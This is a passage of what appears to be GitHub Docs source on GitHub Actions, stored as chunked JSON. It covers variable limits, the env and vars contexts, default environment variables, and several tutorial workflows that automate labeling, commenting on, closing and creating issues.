variable**.\n{% data reusables.actions.variable-fields %}\n1. From the **Repository access** dropdown list, choose an access policy.\n1. Click **Add variable**.\n\n\n\nLimits for configuration variables\n\n{% ifversion ghes %}\n{% ifversion ghes > 3.8 %}\n\nIndividual variables are limited to 48 KB in size.\n\nYou can store up to 1,000 organization variables, 500 variables per repository, and 100 variables per environment. The total combined size limit for organization and repository variables is 10 MB per workflow run.\n\nA workflow created in a repository can access the following number of variables:\n\n- Up to 500 repository variables, if the total size of repository variables is less than 10 MB. If the total size of repository variables exceeds 10 MB, only the repository variables that fall below the limit will be available (as sorted alphabetically by variable name).\n- Up to 1,000 organization variables, if the total combined size of repository and organization variables is less than 10 MB. If the total combined size of organization and repository variables exceeds 10 MB, only the organization variables that fall below that limit will be available (after accounting for repository variables and as sorted alphabetically by variable name).\n- Up to 100 environment-level variables.\n\n{% note %}\n\n**Note**: Environment-level variables do not count toward the 10 MB total size limit. If you exceed the combined size limit for repository and organization variables and still need additional variables, you can use an environment and define additional variables in the environment.\n\n{% endnote %}\n{% elsif ghes < 3.9 %}\n\nIndividual variables are limited to 48 KB in size.\n\nYou can store up to 1,000 organization variables, 100 variables per repository, and 100 variables per environment.\n\nA workflow created in a repository can access the following number of variables:\n\n- All 100 repository variables.\n- If the repository is assigned access t", "Y2h1bmtfNV9pbmRleF8xMzc=": "o more than 100 organization variables, the workflow can only use the first 100 organization variables (sorted alphabetically by variable name).\n- All 100 environment-level variables.\n{% endif %}\n\n{% else %}\n\nIndividual variables are limited to 48 KB in size.\n\nYou can store up to 1,000 organization variables, 500 variables per repository, and 100 variables per environment. The total combined size limit for organization and repository variables is 256 KB per workflow run.\n\nA workflow created in a repository can access the following number of variables:\n\n- Up to 500 repository variables, if the total size of repository variables is less than 256 KB. If the total size of repository variables exceeds 256 KB, only the repository variables that fall below the limit will be available (as sorted alphabetically by variable name).\n- Up to 1,000 organization variables, if the total combined size of repository and organization variables is less than 256 KB. If the total combined size of organization and repository variables exceeds 256 KB, only the organization variables that fall below that limit will be available (after accounting for repository variables and as sorted alphabetically by variable name).\n- Up to 100 environment-level variables.\n\n{% note %}\n\n**Note**: Environment-level variables do not count toward the 256 KB total size limit. If you exceed the combined size limit for repository and organization variables and still need additional variables, you can use an environment and define additional variables in the environment.\n\n{% endnote %}\n\n{% endif %}\n{% endif %}\n\n\n\nUsing contexts to access variable values\n\n{% data reusables.actions.actions-contexts-about-description %} For more information, see \"AUTOTITLE\". There are many other contexts that you can use for a variety of purposes in your workflows. For details of where you can use specific contexts within a workflow, see \"AUTOTITLE.\"\n\nYou can access environment variable values using the `env` context{% ifversion actions-configuration-variables %} and configuration", "Y2h1bmtfNl9pbmRleF8xMzc=": " variable values using the `vars` context{% endif %}.\n\n\n\nUsing the `env` context to access environment variable values\n\nIn addition to runner environment variables, {% data variables.product.prodname_actions %} allows you to set and read `env` key values using contexts. Environment variables and contexts are intended for use at different points in the workflow.\n\nThe `run` steps in a workflow, or in a referenced action, are processed by a runner. As a result, you can use runner environment variables here, using the appropriate syntax for the shell you are using on the runner - for example, `$NAME` for the bash shell on a Linux runner, or `$env:NAME` for PowerShell on a Windows runner. In most cases you can also use contexts, with the syntax {% raw %}`${{ CONTEXT.PROPERTY }}`{% endraw %}, to access the same value. The difference is that the context will be interpolated and replaced by a string before the job is sent to a runner.\n\nHowever, you cannot use runner environment variables in parts of a workflow that are processed by {% data variables.product.prodname_actions %} and are not sent to the runner. Instead, you must use contexts. For example, an `if` conditional, which determines whether a job or step is sent to the runner, is always processed by {% data variables.product.prodname_actions %}. You must therefore use a context in an `if` conditional statement to access the value of an variable.\n\n{% raw %}\n\n```yaml copy\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        if: ${{ env.DAY_OF_WEEK == 'Monday' }}\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n```\n\n{% endraw %}\n\nIn this modification of the earlier example, we've introduced an `if` conditional. The workflow step is now only run if `DAY_OF_WEEK` is set to \"Monday\". We access this value from the `if` conditional statement by using the `env` context. The `env` context is not require", "Y2h1bmtfN19pbmRleF8xMzc=": "d for the variables referenced within the `run` command. They are referenced as runner environment variables and are interpolated after the job is received by the runner. We could, however, have chosen to interpolate those variables before sending the job to the runner, by using contexts. The resulting output would be the same.\n\n{% raw %}\n\n```yaml\nrun: echo \"${{ env.Greeting }} ${{ env.First_Name }}. Today is ${{ env.DAY_OF_WEEK }}!\"\n```\n\n{% endraw %}\n\n{% note %}\n\n**Note**: Contexts are usually denoted using the dollar sign and curly braces, as {% raw %}`${{ context.property }}`{% endraw %}. In an `if` conditional, the {% raw %}`${{` and `}}`{% endraw %} are optional, but if you use them they must enclose the entire comparison statement, as shown above.\n\n{% endnote %}\n\nYou will commonly use either the `env` or `github` context to access variable values in parts of the workflow that are processed before jobs are sent to runners.\n\n| Context | Use case | Example |\n| --- | --- | --- |\n| `env` | Reference custom variables defined in the workflow. | {% raw %}`${{ env.MY_VARIABLE }}`{% endraw %} |\n| `github` | Reference information about the workflow run and the event that triggered the run. | {% raw %}`${{ github.repository }}`{% endraw %} |\n\n{% data reusables.actions.context-injection-warning %}\n\n{% ifversion actions-configuration-variables %}\n\n\n\nUsing the `vars` context to access configuration variable values\n\nConfiguration variables can be accessed across the workflow using `vars` context. For more information, see \"AUTOTITLE\".\n\n{% data reusables.actions.actions-vars-context-example-usage %}\n\n{% endif %}\n\n\n\nDefault environment variables\n\nThe default environment variables that {% data variables.product.prodname_dotcom %} sets are available to every step in a workflow.\n\nBecause default environment variables are set by {% data variables.product.prodname_dotcom %} and not defined in a workflow, they are not accessible through the `env` context. However, most of the default variables have a corresponding, and similarly n", "Y2h1bmtfOF9pbmRleF8xMzc=": "amed, context property. For example, the value of the `GITHUB_REF` variable can be read during workflow processing using the {% raw %}`${{ github.ref }}`{% endraw %} context property.\n\n{% data reusables.actions.environment-variables-are-fixed %} For more information about setting environment variables, see \"Defining environment variables for a single workflow\" and \"AUTOTITLE.\"\n\nWe strongly recommend that actions use variables to access the filesystem rather than using hardcoded file paths. {% data variables.product.prodname_dotcom %} sets variables for actions to use in all runner environments.\n\n| Variable | Description |\n| ---------|------------ |\n| `CI` | Always set to `true`. |\n| `GITHUB_ACTION` | The name of the action currently running, or the `id` of a step. For example, for an action, `__repo-owner_name-of-action-repo`.{% data variables.product.prodname_dotcom %} removes special characters, and uses the name `__run` when the current step runs a script without an `id`. If you use the same script or action more than once in the same job, the name will include a suffix that consists of the sequence number preceded by an underscore. For example, the first script you run will have the name `__run`, and the second script will be named `__run_2`. Similarly, the second invocation of `actions/checkout` will be `actionscheckout2`. |\n| `GITHUB_ACTION_PATH` | The path where an action is located. This property is only supported in composite actions. You can use this path to change directories to where the action is located and access other files in that same repository. For example, `/home/runner/work/_actions/repo-owner/name-of-action-repo/v1`. |\n| `GITHUB_ACTION_REPOSITORY` | For a step executing an action, this is the owner and repository name of the action. For example, `actions/checkout`. |\n| `GITHUB_ACTIONS` | Always set to `true` when {% data variables.product.prodname_actions %} is running the workflow. You can use this variable to differentiate when tests are being run locally or by {% data variables.product.p", "Y2h1bmtfOV9pbmRleF8xMzc=": "rodname_actions %}.\n| `GITHUB_ACTOR` | The name of the person or app that initiated the workflow. For example, `octocat`. |\n{%- ifversion actions-oidc-custom-claims %}\n| `GITHUB_ACTOR_ID` | {% data reusables.actions.actor_id-description %} |\n{%- endif %}\n| `GITHUB_API_URL` | Returns the API URL. For example: `{% data variables.product.api_url_code %}`.\n| `GITHUB_BASE_REF` | The name of the base ref or target branch of the pull request in a workflow run. This is only set when the event that triggers a workflow run is either `pull_request` or `pull_request_target`. For example, `main`. |\n| `GITHUB_ENV` | The path on the runner to the file that sets variables from workflow commands. This file is unique to the current step and changes for each step in a job. For example, `/home/runner/work/_temp/_runner_file_commands/set_env_87406d6e-4979-4d42-98e1-3dab1f48b13a`. For more information, see \"AUTOTITLE.\" |\n| `GITHUB_EVENT_NAME` | The name of the event that triggered the workflow. For example, `workflow_dispatch`. |\n| `GITHUB_EVENT_PATH` | The path to the file on the runner that contains the full event webhook payload. For example, `/github/workflow/event.json`. |\n| `GITHUB_GRAPHQL_URL` | Returns the GraphQL API URL. For example: `{% data variables.product.graphql_url_code %}`.\n| `GITHUB_HEAD_REF` | The head ref or source branch of the pull request in a workflow run. This property is only set when the event that triggers a workflow run is either `pull_request` or `pull_request_target`. For example, `feature-branch-1`. |\n| `GITHUB_JOB` | The job_id of the current job. For example, `greeting_job`. |\n| `GITHUB_OUTPUT` | The path on the runner to the file that sets the current step's outputs from workflow commands. This file is unique to the current step and changes for each step in a job.  For example, `/home/runner/work/_temp/_runner_file_commands/set_output_a50ef383-b063-46d9-9157-57953fc9f3f0`. For more information, see \"AUTOTITLE.\" |\n| `GITHUB_PATH` | The path on the runner to the file that sets system `PATH` variables ", "Y2h1bmtfMTBfaW5kZXhfMTM3": "from workflow commands. This file is unique to the current step and changes for each step in a job.  For example, `/home/runner/work/_temp/_runner_file_commands/add_path_899b9445-ad4a-400c-aa89-249f18632cf5`. For more information, see \"AUTOTITLE.\" |\n| `GITHUB_REF` | {% data reusables.actions.ref-description %} |\n| `GITHUB_REF_NAME` | {% data reusables.actions.ref_name-description %} |\n| `GITHUB_REF_PROTECTED` | {% data reusables.actions.ref_protected-description %} |\n| `GITHUB_REF_TYPE` | {% data reusables.actions.ref_type-description %} |\n| `GITHUB_REPOSITORY` | The owner and repository name. For example, `octocat/Hello-World`. |\n{%- ifversion actions-oidc-custom-claims %}\n| `GITHUB_REPOSITORY_ID` | {% data reusables.actions.repository_id-description %} |\n{%- endif %}\n| `GITHUB_REPOSITORY_OWNER` | The repository owner's name. For example, `octocat`. |\n{%- ifversion actions-oidc-custom-claims %}\n| `GITHUB_REPOSITORY_OWNER_ID` | {% data reusables.actions.repository_owner_id-description %} |\n{%- endif %}\n| `GITHUB_RETENTION_DAYS` | The number of days that workflow run logs and artifacts are kept. For example, `90`. |\n| `GITHUB_RUN_ATTEMPT` | A unique number for each attempt of a particular workflow run in a repository. This number begins at 1 for the workflow run's first attempt, and increments with each re-run. For example, `3`. |\n| `GITHUB_RUN_ID` | {% data reusables.actions.run_id_description %} For example, `1658821493`. |\n| `GITHUB_RUN_NUMBER` | {% data reusables.actions.run_number_description %} For example, `3`. |\n| `GITHUB_SERVER_URL`| The URL of the {% data variables.product.product_name %} server. For example: `https://{% data variables.product.product_url %}`.\n| `GITHUB_SHA` | {% data reusables.actions.github_sha_description %} |\n{%- ifversion actions-job-summaries %}\n| `GITHUB_STEP_SUMMARY` | The path on the runner to the file that contains job summaries from workflow commands. This file is unique to the current step and changes for each step in a job. For example, `/home/runner/_layout/_work/_temp/_run", "Y2h1bmtfMTFfaW5kZXhfMTM3": "ner_file_commands/step_summary_1cb22d7f-5663-41a8-9ffc-13472605c76c`. For more information, see \"AUTOTITLE.\" |\n{%- endif %}\n{%- ifversion actions-stable-actor-ids %}\n| `GITHUB_TRIGGERING_ACTOR` | {% data reusables.actions.github-triggering-actor-description %} |\n {%- endif %}\n| `GITHUB_WORKFLOW` | The name of the workflow. For example, `My test workflow`. If the workflow file doesn't specify a `name`, the value of this variable is the full path of the workflow file in the repository. |\n{%- ifversion actions-oidc-custom-claims %}\n| `GITHUB_WORKFLOW_REF` | {% data reusables.actions.workflow-ref-description %} |\n| `GITHUB_WORKFLOW_SHA` | {% data reusables.actions.workflow-sha-description %} |\n{%- endif %}\n| `GITHUB_WORKSPACE` | The default working directory on the runner for steps, and the default location of your repository when using the `checkout` action. For example, `/home/runner/work/my-repo-name/my-repo-name`. |\n{%- ifversion actions-runner-arch-envvars %}\n| `RUNNER_ARCH` | {% data reusables.actions.runner-arch-description %} |\n{%- endif %}\n| `RUNNER_DEBUG` | {% data reusables.actions.runner-debug-description %} |\n| `RUNNER_NAME` | {% data reusables.actions.runner-name-description %} For example, `Hosted Agent` |\n| `RUNNER_OS` | {% data reusables.actions.runner-os-description %} For example, `Windows` |\n| `RUNNER_TEMP` | {% data reusables.actions.runner-temp-directory-description %} For example, `D:\\a\\_temp` |\n{%- ifversion not ghae %}\n| `RUNNER_TOOL_CACHE` | {% data reusables.actions.runner-tool-cache-description %} For example, `C:\\hostedtoolcache\\windows` |\n{%- endif %}\n\n{% note %}\n\n**Note:** If you need to use a workflow run's URL from within a job, you can combine these variables: `$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID`\n\n{% endnote %}\n\n\n\nDetecting the operating system\n\nYou can write a single workflow file that can be used for different operating systems by using the `RUNNER_OS` default environment variable and the corresponding context property {% raw %}`${{ runner.os }}`{% en", "Y2h1bmtfMTJfaW5kZXhfMTM3": "draw %}. For example, the following workflow could be run successfully if you changed the operating system from `macos-latest` to `windows-latest` without having to alter the syntax of the environment variables, which differs depending on the shell being used by the runner.\n\n{% raw %}\n\n```yaml copy\njobs:\n  if-Windows-else:\n    runs-on: macos-latest\n    steps:\n      - name: condition 1\n        if: runner.os == 'Windows'\n        run: echo \"The operating system on the runner is $env:RUNNER_OS.\"\n      - name: condition 2\n        if: runner.os != 'Windows'\n        run: echo \"The operating system on the runner is not Windows, it's $RUNNER_OS.\"\n```\n\n{% endraw %}\n\nIn this example, the two `if` statements check the `os` property of the `runner` context to determine the operating system of the runner. `if` conditionals are processed by {% data variables.product.prodname_actions %}, and only steps where the check resolves as `true` are sent to the runner. Here one of the checks will always be `true` and the other `false`, so only one of these steps is sent to the runner. Once the job is sent to the runner, the step is executed and the environment variable in the `echo` command is interpolated using the appropriate syntax (`$env:NAME` for PowerShell on Windows, and `$NAME` for bash and sh on Linux and MacOS). In this example, the statement `runs-on: macos-latest` means that the second step will be run.\n\n\n\nPassing values between steps and jobs in a workflow\n\n If you generate a value in one step of a job, you can use the value in subsequent steps of the same job by assigning the value to an existing or new environment variable and then writing this to the `GITHUB_ENV` environment file. The environment file can be used directly by an action, or from a shell command in the workflow file by using the `run` keyword. For more information, see \"AUTOTITLE.\"\n\n If you want to pass a value from a step in one job in a workflow to a step in another job in the workflow, you can define the value as a job output. You can then reference this ", "Y2h1bmtfMTNfaW5kZXhfMTM3": "job output from a step in another job. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xMzg=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the {% data variables.product.prodname_cli %} in a workflow to label newly opened or reopened issues. For example, you can add the `triage` label every time an issue is opened or reopened. Then, you can see all issues that need to be triaged by filtering for issues with the `triage` label.\n\nThe {% data variables.product.prodname_cli %} allows you to easily use the {% data variables.product.prodname_dotcom %} API in a workflow.\n\nIn the tutorial, you will first make a workflow file that uses the {% data variables.product.prodname_cli %}. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n  \n    ```yaml copy\n    name: Label issues\n    on:\n      issues:\n        types:\n          - reopened\n          - opened\n    jobs:\n      label_issues:\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n        steps:\n          - run: gh issue edit \"$NUMBER\" --add-label \"$LABELS\"\n            env:\n              GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n              GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n              NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n              LABELS: triage\n    ```\n\n1. Customize the `env` values in your workflow file:\n   - The `GITHUB_TOKEN`, `GH_REPO`, and `NUMBER` values are automatically set using the `github` and `secrets` contexts. You do not need to change these.\n   - Change the value for `LABELS` to the list of labels that you want to add to the issue. The label(s) must exist for your repository. Separate multiple labels with commas. For example, `help wanted,good first issue`. For more information about labels, see \"AUTOTITLE.\"\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nTesting the workflow\n\nEvery time an issue in your repository is opened or reopened, this workflow wil", "Y2h1bmtfMV9pbmRleF8xMzg=": "l add the labels that you specified to the issue.\n\nTest out your workflow by creating an issue in your repository.\n\n1. Create an issue in your repository. For more information, see \"AUTOTITLE.\"\n1. To see the workflow run that was triggered by creating the issue, view the history of your workflow runs. For more information, see \"AUTOTITLE.\"\n1. When the workflow completes, the issue that you created should have the specified labels added.\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the {% data variables.product.prodname_cli %}, see the GitHub CLI manual.\n- To learn more about different events that can trigger your workflow, see \"AUTOTITLE.\"\n- Search GitHub for examples of workflows using `gh issue edit`.\n\n", "Y2h1bmtfMF9pbmRleF8xMzk=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the `actions/stale` action to comment on and close issues that have been inactive for a certain period of time. For example, you can comment if an issue has been inactive for 30 days to prompt participants to take action. Then, if no additional activity occurs after 14 days, you can close the issue.\n\nIn the tutorial, you will first make a workflow file that uses the `actions/stale` action. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n\n    ```yaml copy\n    name: Close inactive issues\n    on:\n      schedule:\n        - cron: \"30 1 * * *\"\n\n    jobs:\n      close-issues:\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n          pull-requests: write\n        steps:\n          - uses: {% data reusables.actions.action-stale %}\n            with:\n              days-before-issue-stale: 30\n              days-before-issue-close: 14\n              stale-issue-label: \"stale\"\n              stale-issue-message: \"This issue is stale because it has been open for 30 days with no activity.\"\n              close-issue-message: \"This issue was closed because it has been inactive for 14 days since being marked as stale.\"\n              days-before-pr-stale: -1\n              days-before-pr-close: -1\n              repo-token: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n    ```\n\n1. Customize the parameters in your workflow file:\n   - Change the value for `on.schedule` to dictate when you want this workflow to run. In the example above, the workflow will run every day at 1:30 UTC. For more information about scheduled workflows, see \"AUTOTITLE.\"\n   - Change the value for `days-before-issue-stale` to the number of days without activity before the `actions/stale` action labels an issue. If you never want this action to label issues, set this value to `-1`.\n   - Change the ", "Y2h1bmtfMV9pbmRleF8xMzk=": "value for `days-before-issue-close` to the number of days without activity before the `actions/stale` action closes an issue. If you never want this action to close issues, set this value to `-1`.\n   - Change the value for `stale-issue-label` to the label that you want to apply to issues that have been inactive for the amount of time specified by `days-before-issue-stale`.\n   - Change the value for `stale-issue-message` to the comment that you want to add to issues that are labeled by the `actions/stale` action.\n   - Change the value for `close-issue-message` to the comment that you want to add to issues that are closed by the `actions/stale` action.\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nExpected results\n\nBased on the `schedule` parameter (for example, every day at 1:30 UTC), your workflow will find issues that have been inactive for the specified period of time and will add the specified comment and label. Additionally, your workflow will close any previously labeled issues if no additional activity has occurred for the specified period of time.\n\n{% data reusables.actions.schedule-delay %}\n\nYou can view the history of your workflow runs to see this workflow run periodically. For more information, see \"AUTOTITLE.\"\n\nThis workflow will only label and/or close 30 issues at a time in order to avoid exceeding a rate limit. You can configure this with the `operations-per-run` setting. For more information, see the `actions/stale` action documentation.\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the `actions/stale` action, like closing inactive pull requests, ignoring issues with certain labels or milestones, or only checking issues with certain labels, see the `actions/stale` action documentation.\n- Search GitHub for examples of workflows using this action.\n\n", "Y2h1bmtfMF9pbmRleF8xNDA=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the {% data variables.product.prodname_cli %} to comment on an issue when a specific label is applied. For example, when the `help wanted` label is added to an issue, you can add a comment to encourage contributors to work on the issue. For more information about {% data variables.product.prodname_cli %}, see \"AUTOTITLE.\"\n\nIn the tutorial, you will first make a workflow file that uses the `gh issue comment` command to comment on an issue. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n\n    ```yaml copy\n    name: Add comment\n    on:\n      issues:\n        types:\n          - labeled\n    jobs:\n      add-comment:\n        if: github.event.label.name == 'help wanted'\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n        steps:\n          - name: Add comment\n            run: gh issue comment \"$NUMBER\" --body \"$BODY\"\n            env:\n              GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n              GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n              NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n              BODY: >\n                This issue is available for anyone to work on.\n                **Make sure to reference this issue in your pull request.**\n                :sparkles: Thank you for your contribution! :sparkles:\n    ```\n\n1. Customize the parameters in your workflow file:\n   - Replace `help wanted` in `if: github.event.label.name == 'help wanted'` with the label that you want to act on. If you want to act on more than one label, separate the conditions with `||`. For example, `if: github.event.label.name == 'bug' || github.event.label.name == 'fix me'` will comment whenever the `bug` or `fix me` labels are added to an issue.\n   - Change the value for `BODY` to the comment that you want", "Y2h1bmtfMV9pbmRleF8xNDA=": " to add. GitHub flavored markdown is supported. For more information about markdown, see \"AUTOTITLE.\"\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nTesting the workflow\n\nEvery time an issue in your repository is labeled, this workflow will run. If the label that was added is one of the labels that you specified in your workflow file, the `gh issue comment` command will add the comment that you specified to the issue.\n\nTest your workflow by applying your specified label to an issue.\n\n1. Open an issue in your repository. For more information, see \"AUTOTITLE.\"\n1. Label the issue with the specified label in your workflow file. For more information, see \"AUTOTITLE.\"\n1. To see the workflow run triggered by labeling the issue, view the history of your workflow runs. For more information, see \"AUTOTITLE.\"\n1. When the workflow completes, the issue that you labeled should have a comment added.\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the GitHub CLI, like editing existing comments, visit the GitHub CLI Manual.\n\n", "Y2h1bmtfMF9pbmRleF8xNDE=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the `alex-page/github-project-automation-plus` action to automatically move an issue to a specific column on a project board when the issue is assigned. For example, when an issue is assigned, you can move it into the `In Progress` column your project board.\n\nIn the tutorial, you will first make a workflow file that uses the `alex-page/github-project-automation-plus` action. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. In your repository, choose a project board. You can use an existing project, or you can create a new project. For more information about creating a project, see \"AUTOTITLE.\"\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n\n    ```yaml copy\n    {% data reusables.actions.actions-not-certified-by-github-comment %}\n\n    {% data reusables.actions.actions-use-sha-pinning-comment %}\n\n    name: Move assigned card\n    on:\n      issues:\n        types:\n          - assigned\n    jobs:\n      move-assigned-card:\n        runs-on: ubuntu-latest\n        steps:\n          - uses: alex-page/github-project-automation-plus@7ffb872c64bd809d23563a130a0a97d01dfa8f43\n            with:\n              project: Docs Work\n              column: In Progress\n              repo-token: {% raw %}${{ secrets.PERSONAL_ACCESS_TOKEN }}{% endraw %}\n    ```\n\n1. Customize the parameters in your workflow file:\n   - Change the value for `project` to the name of your project board. If you have multiple project boards with the same name, the `alex-page/github-project-automation-plus` action will act on all projects with the specified name.\n   - Change the value for `column` to the name of the column where you want issues to move when they are assigned.\n   - Change the value for `repo-token`:\n     1. Create a {% data variables.product.pat_v1 %} with the `repo` scope. For more information, see \"AUTOTITLE.\"\n     1. Store this {% data variables.produ", "Y2h1bmtfMV9pbmRleF8xNDE=": "ct.pat_generic %} as a secret in your repository. For more information about storing secrets, see \"AUTOTITLE.\"\n     1. In your workflow file, replace `PERSONAL_ACCESS_TOKEN` with the name of your secret.\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nTesting the workflow\n\nWhenever an issue in your repository is assigned, the issue will be moved to the specified project board column. If the issue is not already on the project board, it will be added to the project board.\n\nIf your repository is user-owned, the `alex-page/github-project-automation-plus` action will act on all projects in your repository or personal account that have the specified project name and column. Likewise, if your repository is organization-owned, the action will act on all projects in your repository or organization that have the specified project name and column.\n\nTest your workflow by assigning an issue in your repository.\n\n1. Open an issue in your repository. For more information, see \"AUTOTITLE.\"\n1. Assign the issue. For more information, see \"AUTOTITLE.\"\n1. To see the workflow run that assigning the issue triggered, view the history of your workflow runs. For more information, see \"AUTOTITLE.\"\n1. When the workflow completes, the issue that you assigned should be added to the specified project board column.\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the `alex-page/github-project-automation-plus` action, like deleting or archiving project cards, visit the `alex-page/github-project-automation-plus` action documentation.\n\n", "Y2h1bmtfMF9pbmRleF8xNDI=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the `actions/github-script` action along with a conditional to remove a label from issues and pull requests that are added to a specific column on a {% data variables.projects.projects_v1_board %}. For example, you can remove the `needs review` label when project cards are moved into the `Done` column.\n\nIn the tutorial, you will first make a workflow file that uses the `actions/github-script` action. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. Choose a {% data variables.projects.projects_v1_board %} that belongs to the repository. This workflow cannot be used with projects that belong to users or organizations. You can use an existing {% data variables.projects.projects_v1_board %}, or you can create a new {% data variables.projects.projects_v1_board %}. For more information about creating a project, see \"AUTOTITLE.\"\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n\n    ```yaml copy\n    name: Remove a label\n    on:\n      project_card:\n        types:\n          - moved\n    jobs:\n      remove_label:\n        if: github.event.project_card.column_id == '12345678'\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n          pull-requests: write\n        steps:\n          - uses: {% data reusables.actions.action-github-script %}\n            with:\n              script: |\n                // this gets the number at the end of the content URL, which should be the issue/PR number\n                const issue_num = context.payload.project_card.content_url.split('/').pop()\n                github.rest.issues.removeLabel({\n                  issue_number: issue_num,\n                  owner: context.repo.owner,\n                  repo: context.repo.repo,\n                  name: [\"needs review\"]\n                })\n    ```\n\n1. Customize the parameters in your workflow file:\n   - In `github.event.project_card.colu", "Y2h1bmtfMV9pbmRleF8xNDI=": "mn_id == '12345678'`, replace `12345678` with the ID of the column where you want to un-label issues and pull requests that are moved there.\n\n     To find the column ID, navigate to your {% data variables.projects.projects_v1_board %}. Next to the title of the column, click {% octicon \"kebab-horizontal\" aria-label=\"Column menu\" %} then click **Copy column link**. The column ID is the number at the end of the copied link. For example, `24687531` is the column ID for `https://github.com/octocat/octo-repo/projects/1#column-24687531`.\n\n     If you want to act on more than one column, separate the conditions with `||`. For example, `if github.event.project_card.column_id == '12345678' || github.event.project_card.column_id == '87654321'` will act whenever a project card is added to column `12345678` or column `87654321`. The columns may be on different project boards.\n   - Change the value for `name` in the `github.rest.issues.removeLabel()` function to the name of the label that you want to remove from issues or pull requests that are moved to the specified column(s). For more information on labels, see \"AUTOTITLE.\"\n1. {% data reusables.actions.commit-workflow %}\n\n\n\nTesting the workflow\n\nEvery time a project card on a {% data variables.projects.projects_v1_board %} in your repository moves, this workflow will run. If the card is an issue or a pull request and is moved into the column that you specified, then the workflow will remove the specified label from the issue or a pull request. Cards that are notes will not be affected.\n\nTest your workflow out by moving an issue on your {% data variables.projects.projects_v1_board %} into the target column.\n\n1. Open an issue in your repository. For more information, see \"AUTOTITLE.\"\n1. Label the issue with the label that you want the workflow to remove. For more information, see \"AUTOTITLE.\"\n1. Add the issue to the {% data variables.projects.projects_v1_board %} column that you specified in your workflow file. For more information, see \"AUTOTITLE.\"\n1. To see the workflow run ", "Y2h1bmtfMl9pbmRleF8xNDI=": "that was triggered by adding the issue to the project, view the history of your workflow runs. For more information, see \"AUTOTITLE.\"\n1. When the workflow completes, the issue that you added to the project column should have the specified label removed.\n\n\n\nNext steps\n\n- To learn more about additional things you can do with the `actions/github-script` action, see the `actions/github-script` action documentation.\n- Search GitHub for examples of workflows using this action.\n\n", "Y2h1bmtfMF9pbmRleF8xNDM=": "\n\nIntroduction\n\nThis tutorial demonstrates how to use the {% data variables.product.prodname_cli %} to create an issue on a regular basis. For example, you can create an issue each week to use as the agenda for a team meeting. For more information about {% data variables.product.prodname_cli %}, see \"AUTOTITLE.\"\n\nIn the tutorial, you will first make a workflow file that uses the {% data variables.product.prodname_cli %}. Then, you will customize the workflow to suit your needs.\n\n\n\nCreating the workflow\n\n1. {% data reusables.actions.choose-repo %}\n1. {% data reusables.actions.make-workflow-file %}\n1. Copy the following YAML contents into your workflow file.\n\n    ```yaml copy\n    name: Weekly Team Sync\n    on:\n      schedule:\n        - cron: 20 07 * * 1\n\n    jobs:\n      create_issue:\n        name: Create team sync issue\n        runs-on: ubuntu-latest\n        permissions:\n          issues: write\n        steps:\n          - name: Create team sync issue\n            run: |\n              if [[ $CLOSE_PREVIOUS == true ]]; then\n                previous_issue_number=$(gh issue list \\\n                  --label \"$LABELS\" \\\n                  --json number \\\n                  --jq '.[0].number')\n                if [[ -n $previous_issue_number ]]; then\n                  gh issue close \"$previous_issue_number\"\n                  gh issue unpin \"$previous_issue_number\"\n                fi\n              fi\n              new_issue_url=$(gh issue create \\\n                --title \"$TITLE\" \\\n                --assignee \"$ASSIGNEES\" \\\n                --label \"$LABELS\" \\\n                --body \"$BODY\")\n              if [[ $PINNED == true ]]; then\n                gh issue pin \"$new_issue_url\"\n              fi\n            env:\n              GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n              GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n              TITLE: Team sync\n              ASSIGNEES: monalisa,doctocat,hubot\n              LABELS: weekly sync,docs-team\n              BODY: |\n                ### Agenda\n\n ", "Y2h1bmtfMV9pbmRleF8xNDM=": 